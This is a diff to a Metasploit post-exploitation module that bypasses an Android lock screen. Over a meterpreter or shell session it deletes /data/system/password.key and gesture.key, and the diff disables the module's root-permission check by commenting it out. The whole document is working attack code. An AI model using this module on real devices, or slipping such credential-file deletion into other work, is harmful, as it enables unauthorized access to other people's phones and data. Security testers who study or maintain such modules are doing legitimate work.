@@ -18,6 +18,7 @@ class Metasploit4 < Msf::Post
             In some cases the original lock method will still be present but any key/gesture will
             unlock the device.
         },
+        'Privileged'    => true,
         'License'       => MSF_LICENSE,
         'Author'        => [ 'timwr' ],
         'SessionTypes'  => [ 'meterpreter', 'shell' ],
@@ -29,12 +30,19 @@ class Metasploit4 < Msf::Post
   def run
     id = cmd_exec('id')
     unless id =~ /root/
-      print_error("This module requires root permissions")
-      return
+      #print_error("This module requires root permissions")
+      #return
     end
 
-    cmd_exec('rm /data/system/password.key')
-    cmd_exec('rm /data/system/gesture.key')
+    %W{
+      /data/system/password.key
+      /data/system/gesture.key
+    }.each do |path|
+      print_status("Removing #{path}")
+      cmd_exec("rm #{path}")
+    end
+
+    print_status("Device should be unlocked or no longer require a pin")
   end
 
 end
